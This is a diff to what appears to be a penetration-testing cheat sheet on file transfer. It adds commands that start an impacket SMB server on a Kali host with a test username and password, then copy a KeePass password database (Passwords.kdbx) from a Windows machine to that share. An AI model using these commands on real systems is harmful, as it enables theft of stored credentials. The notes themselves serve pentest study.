@@ -145,6 +145,15 @@ windows:
 net use \\linuxIP\sharename
 copy Passwords.kdbx(windows filename) \\kali ip\sharename\Passwords.kdbx
 ```
+This is for circumvent unauthenticated guest error
+```
+linux:
+impacket-smbserver test(customized sharename) .(current terminal path) -smb2support -username test -password test
+
+windows:
+net use \\linuxIP\sharename /user:test test
+copy Passwords.kdbx(windows filename) \\kali ip\sharename\Passwords.kdbx 
+```
 ### Http 
 ```
 wget url
